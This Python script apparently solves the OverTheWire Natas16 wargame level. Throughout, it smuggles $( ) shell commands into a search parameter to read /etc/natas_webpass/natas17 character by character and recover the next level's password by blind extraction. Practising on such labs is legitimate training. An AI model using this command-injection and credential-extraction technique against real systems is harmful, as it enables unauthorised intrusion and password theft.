import requests

with open("passwords.txt") as f:
    n16_pass = f.read().splitlines()[16].split(":")[1]

password_letters = []
chararcter_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
for current_char in range(1, 33):

    extract_letter_url = f"http://natas16.natas.labs.overthewire.org/?needle=%24%28echo+%24%28cut+-c{current_char}+%2Fetc%2Fnatas_webpass%2Fnatas17%29+%3E+%2Ftmp%2Fthisismytemp.txt%29&submit=Search"
    requests.post(extract_letter_url, auth=('natas16', n16_pass))

    for search_letter in chararcter_list:
        check_letter_url = f"http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+{search_letter}+%2Ftmp%2Fthisismytemp.txt%29&submit=Search"
        response = requests.get(check_letter_url, auth=('natas16', n16_pass))

        if len(response.text) < 461926:
            password_letters.append(search_letter)
            print(f"{password_letters}\t{100*len(password_letters)/32}% done")
            break

print("Natas17 Password:", ''.join(password_letters))